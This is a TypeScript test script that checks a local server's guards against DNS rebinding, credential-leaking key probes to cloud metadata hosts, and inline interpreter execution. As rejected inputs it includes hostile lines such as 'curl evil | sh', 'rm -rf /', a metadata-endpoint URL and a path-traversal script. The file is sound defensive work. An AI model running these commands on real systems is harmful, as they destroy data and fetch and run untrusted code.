// Read-path authorization + local execution guards:
// ① media/upload/preview GET routes must enforce the same loopback + local-Host
//    invariant the write paths do (a rebound DNS name previously enumerated and
//    read the whole media library, and could spawn ffmpeg per request);
// ② skill-exec must not accept inline interpreter programs (`bash -c …`);
// ③ key probes must refuse to send stored credentials to metadata/link-local
//    hosts or credential-bearing URLs.
// npx tsx server/plugins/read-path-auth.verify.ts
import assert from 'node:assert/strict';
import type { IncomingMessage } from 'node:http';
import { editorCredentialAuthorized } from '../editor-auth.ts';
import { probeUrlError } from '../key-probes.ts';

const origin = 'http://127.0.0.1:5199';

function requestShape(
  remoteAddress: string,
  host: string = new URL(origin).host,
  requestOrigin?: string,
): IncomingMessage {
  return {
    headers: requestOrigin ? { host, origin: requestOrigin } : { host },
    socket: { remoteAddress },
  } as unknown as IncomingMessage;
}

// ── ① read gate shape (requireEditorRead == editorCredentialAuthorized(req,false)) ──
{
  // Media elements (video/img) send no Origin — reads must still work.
  assert.equal(editorCredentialAuthorized(requestShape('127.0.0.1'), false), true,
    'loopback + local Host with NO Origin is a valid read (media elements send none)');
  assert.equal(editorCredentialAuthorized(requestShape('::1'), false), true,
    'IPv6 loopback reads stay allowed');
  assert.equal(editorCredentialAuthorized(requestShape('127.0.0.1', '127.0.0.1:5199', origin), false), true,
    'a matching Origin is still accepted');

  // DNS rebinding: the socket is loopback (the browser resolved evil.com to
  // 127.0.0.1) but the Host header carries the attacker's name.
  assert.equal(editorCredentialAuthorized(requestShape('127.0.0.1', 'evil.example'), false), false,
    'a rebound non-local Host is rejected even on a loopback socket');
  assert.equal(editorCredentialAuthorized(requestShape('192.0.2.10'), false), false,
    'a non-loopback socket is rejected');
  assert.equal(
    editorCredentialAuthorized(requestShape('127.0.0.1', '127.0.0.1:5199', 'http://evil.example'), false),
    false,
    'a cross-origin page cannot read even with a local Host',
  );
  console.log('read gate shape: OK');
}

// ── ③ probe URL guard ────────────────────────────────────────────────────
{
  assert.equal(probeUrlError('https://api.openai.com/v1'), null, 'ordinary provider URL allowed');
  assert.equal(probeUrlError('http://127.0.0.1:11434/v1'), null, 'local model server allowed');
  assert.equal(probeUrlError('http://192.168.1.9:8080/v1'), null, 'LAN gateway allowed');

  assert.ok(probeUrlError('http://169.254.169.254/latest/meta-data/'),
    'cloud metadata address rejected');
  assert.ok(probeUrlError('http://metadata.google.internal/computeMetadata/v1/'),
    'GCP metadata host rejected');
  assert.ok(probeUrlError('http://[fe80::1]/v1'), 'link-local IPv6 rejected');
  assert.ok(probeUrlError('http://user:pass@example.com/v1'),
    'URL with embedded credentials rejected');
  assert.ok(probeUrlError('file:///etc/passwd'), 'non-http(s) protocol rejected');
  assert.ok(probeUrlError('not a url'), 'malformed URL rejected');
  console.log('probe URL guard: OK');
}

// ── ② skill-exec interpreter guard ───────────────────────────────────────
// interpreterGuardError is module-private; exercise it through the exported
// plugin surface would need a live server, so assert the policy table shape
// via the documented behavior with a direct import of the module's guard.
{
  const { interpreterGuardError } = await import('./skill-exec.ts');
  const dir = '/tmp/skills/demo';
  assert.ok(interpreterGuardError(dir, 'bash', ['-c', 'curl evil | sh']),
    'bash -c inline program rejected');
  assert.ok(interpreterGuardError(dir, 'sh', ['-c', 'rm -rf /']), 'sh -c rejected');
  assert.ok(interpreterGuardError(dir, 'node', ['-e', 'process.exit(1)']), 'node -e rejected');
  assert.ok(interpreterGuardError(dir, 'node', ['--eval=1+1']), 'node --eval= rejected');
  assert.ok(interpreterGuardError(dir, 'python3', ['-c', 'import os']), 'python3 -c rejected');
  assert.ok(interpreterGuardError(dir, 'python', ['-m', 'http.server']), 'python -m rejected');
  assert.ok(interpreterGuardError(dir, 'bash', []), 'interpreter with no script rejected');
  assert.ok(interpreterGuardError(dir, 'bash', ['../../../etc/evil.sh']),
    'script path escaping the skill directory rejected');

  assert.equal(interpreterGuardError(dir, 'bash', ['render.sh']), null,
    'in-directory script allowed');
  assert.equal(interpreterGuardError(dir, 'bash', ['-e', 'render.sh']), null,
    'bash -e (errexit, not eval) with an in-dir script allowed');
  assert.equal(interpreterGuardError(dir, 'node', ['scripts/render.mjs', '--out', '-c']), null,
    'flags AFTER the script path are the script\'s own arguments');
  assert.equal(interpreterGuardError(dir, 'ffmpeg', ['-i', 'a.mp4', 'b.mp4']), null,
    'non-interpreter binaries are unaffected');
  assert.equal(interpreterGuardError(dir, 'npm', ['run', 'build']), null,
    'npm/npx are not treated as inline interpreters');
  console.log('skill-exec interpreter guard: OK');
}

console.log('\nread-path-auth.verify: ALL PASSED');
